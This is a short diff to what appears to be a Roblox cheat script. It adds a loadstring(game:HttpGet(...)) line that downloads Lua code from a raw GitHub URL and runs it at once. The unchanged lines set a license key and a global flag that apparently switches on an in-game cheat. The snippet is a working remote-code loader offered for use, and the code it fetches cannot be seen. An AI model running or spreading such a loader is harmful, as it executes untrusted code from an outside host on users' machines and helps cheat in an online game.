@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/01/main/Dell"))()
+task.wait(5)
 script_key = "AvcAncvfcZEFOqMnVcRxVZfdiQKjYEgd";
 task.wait(90)
 _G.GDO_LUCKY_WORLD_EVENT = true
